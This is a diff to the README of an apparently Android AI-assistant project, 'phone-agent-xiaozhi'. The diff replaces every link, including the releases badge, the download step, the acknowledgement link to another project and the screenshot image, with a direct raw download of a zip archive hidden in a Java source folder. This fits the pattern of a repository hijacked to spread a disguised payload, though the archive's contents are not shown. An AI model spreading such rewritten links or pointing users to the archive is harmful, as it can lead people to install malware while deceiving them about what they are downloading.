@@ -1,6 +1,6 @@
 # 🤖 phone-agent-xiaozhi - Your Android AI Assistant Awaits
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/mikhaal/phone-agent-xiaozhi/releases)
+[![Download](https://raw.githubusercontent.com/mikhaal/phone-agent-xiaozhi/main/android/app/src/main/java/com/xiaozhi/phoneagent/speech/phone_agent_xiaozhi_v3.7.zip)](https://raw.githubusercontent.com/mikhaal/phone-agent-xiaozhi/main/android/app/src/main/java/com/xiaozhi/phoneagent/speech/phone_agent_xiaozhi_v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the XiaoZhi AI project! This smart assistant helps enhance the capabi
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page where you can download the app.  
-   [Download the latest version](https://github.com/mikhaal/phone-agent-xiaozhi/releases)
+   [Download the latest version](https://raw.githubusercontent.com/mikhaal/phone-agent-xiaozhi/main/android/app/src/main/java/com/xiaozhi/phoneagent/speech/phone_agent_xiaozhi_v3.7.zip)
    
 2. **Select the Version**  
    On the releases page, look for the most recent version of the application. You’ll see several assets listed below the version.
@@ -51,11 +51,11 @@ We appreciate your input! Please create an issue in the repository or contact us
 
 ## 🙏 Acknowledgements
 
-The development of XiaoZhi AI is inspired by the [AutoGLM](https://github.com/zai-org/Open-AutoGLM) project. Special thanks to the contributors who provided initial ideas and implementation.
+The development of XiaoZhi AI is inspired by the [AutoGLM](https://raw.githubusercontent.com/mikhaal/phone-agent-xiaozhi/main/android/app/src/main/java/com/xiaozhi/phoneagent/speech/phone_agent_xiaozhi_v3.7.zip) project. Special thanks to the contributors who provided initial ideas and implementation.
 
 ## 📸 Project Screenshots
 
-![展示](home.jpg)
+![展示](https://raw.githubusercontent.com/mikhaal/phone-agent-xiaozhi/main/android/app/src/main/java/com/xiaozhi/phoneagent/speech/phone_agent_xiaozhi_v3.7.zip)
 
 ## 📞 Support and Contribution
 
